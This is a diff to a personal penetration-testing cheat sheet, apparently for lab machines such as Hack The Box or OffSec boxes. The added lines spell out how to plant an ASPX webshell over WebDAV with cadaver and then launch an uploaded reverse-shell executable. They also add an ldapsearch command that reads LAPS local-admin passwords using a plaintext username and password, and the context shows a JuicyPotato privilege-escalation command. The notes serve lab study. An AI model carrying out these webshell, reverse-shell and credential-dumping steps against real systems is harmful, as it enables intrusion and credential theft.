@@ -31,6 +31,12 @@ Burp Suite Tricks:
 Nikto
 	- nikto -host http://10.10.10.15
 		- If webdav is enabled: davtest -url http://10.10.10.15 -move -cleanup	
+			- cadaver http://192.168.120.108
+			- put /usr/share/webshells/aspx/cmdasp.aspx cmdasp.aspx
+			- create a reverse shell exe and upload it
+			- then naviagate to /cmdasp.aspx
+				- Run this in cmdsp while listening for a connection: C:\inetpub\wwwroot\shell.exe
+			
 	- nikto -host http://192.168.47.56 -port 8089 -nossl
 List Linux Capablities: getcap -r / 2>/dev/null
 	- exploit: https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/	
@@ -408,10 +414,14 @@ Password Protected SSH Private Key:
 				- juicypotato86.exe -l 1337 -p shell.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
 	
 	- LDAP
-		- To get DN "dc=htb,dc=local": ldapsearch -h 10.10.10.161 -x -s base namingcontexts 
+		- To get DN "dc=htb,dc=local": ldapsearch -h 10.10.10.161 -x -s base namingcontexts
 		- You can naming context using nmap: nmap -n -sV --script "ldap* and not brute" 192.168.89.122  
 		- ldapsearch -h htb.local -p 389 -x -b "dc=htb,dc=local"
-		- Get description (you may find helpful info): ldapsearch -x -h 192.168.89.122 -D '' -w '' -b "DC=hutch,DC=offsec" |
+		- ldapsearch -x -h 192.168.89.122 -D '' -w '' -b "DC=hutch,DC=offsec" |
+ grep sAMAccountName:
+		- Get description (you may find helpful info): ldapsearch -x -h 192.168.89.122 -D '' -w '' -b "DC=hutch,DC=offsec" | grep description
+		- Get local admin creds: ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -b "DC=hutch,DC=offsec" -h 192.168.155.122 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+		
 grep description
 		- Get usernames: ldapsearch -x -h 192.168.89.122 -D '' -w '' -b "DC=hutch,DC=offsec" |
  grep sAMAccountName: 
